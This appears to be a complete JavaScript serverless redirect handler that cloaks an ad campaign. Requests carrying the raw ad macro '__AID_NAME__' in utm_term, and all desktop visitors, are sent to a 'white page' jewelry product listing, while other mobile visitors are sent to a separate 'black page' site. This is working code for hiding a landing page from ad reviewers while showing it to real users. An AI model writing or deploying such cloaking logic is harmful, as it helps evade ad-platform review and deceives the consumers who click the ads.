export default function handler(req, res) {
    // URLs to redirect
    const whitePageURL = "https://wanderlustandco.com/products/zyia-gold-bracelet";
    const blackPageURL = "https://kaylacollabz.com/";
  
    // Parse the UTM parameters from the request URL
    const queryParams = new URLSearchParams(req.url.split('?')[1]);
    const utmTerm = queryParams.get('utm_term');
  
    // Get the User-Agent from the request headers
    const userAgent = req.headers['user-agent'] || '';
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  
    // Redirection logic
    if (utmTerm === '__AID_NAME__') {
        // If utm_term matches __AID_NAME__ exactly
        res.writeHead(302, { Location: whitePageURL });
    } else if (isMobileDevice) {
        // Mobile devices without matching parameters
        res.writeHead(302, { Location: blackPageURL });
    } else {
        // Desktop devices without matching parameters
        res.writeHead(302, { Location: whitePageURL });
    }
  
    res.end();
}
